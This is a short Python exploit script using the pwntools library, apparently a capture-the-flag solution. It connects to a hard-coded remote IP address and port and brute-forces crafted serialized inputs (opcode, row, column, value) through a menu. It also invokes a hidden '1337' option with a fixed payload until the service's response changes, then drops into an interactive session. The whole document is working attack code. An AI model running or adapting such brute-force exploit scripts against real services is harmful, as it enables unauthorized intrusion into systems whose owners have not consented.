from pwn import *

def int_to_hex_string(num):
    hex_string = hex(num)[2:]
    if len(hex_string) == 1: hex_string = '0' + hex_string  
    return hex_string

def main():
    conn = remote("85.120.206.124", 31342)

    for i in range(10):
        for j in range(256):

            w_serialized_input = f"0100{int_to_hex_string(i)}000000{int_to_hex_string(j)}00000000000000"
                                #opcode + row + col + value
            print(w_serialized_input)
            conn.sendlineafter(">", b"3")
            conn.sendlineafter("Enter serialized data:", w_serialized_input)
            conn.sendlineafter(">", b"1337")
            conn.sendlineafter("Enter serialized data:", b"feca")

            response = conn.recvline()

            if response != b" [1] Help\n":
                print(response)
                return 1
    conn.interactive()

if __name__ == "__main__":
    main()





